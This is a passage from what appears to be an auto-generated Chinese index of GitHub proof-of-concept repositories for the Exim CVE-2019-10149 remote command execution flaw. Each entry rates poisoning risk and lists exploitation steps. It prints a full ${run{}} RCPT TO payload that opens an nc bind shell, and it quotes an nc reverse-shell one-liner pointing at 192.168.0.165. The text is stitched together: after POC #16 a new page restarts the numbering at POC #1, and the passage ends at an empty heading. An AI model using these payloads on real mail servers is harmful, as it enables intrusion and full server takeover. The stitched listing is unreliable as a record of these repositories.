4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

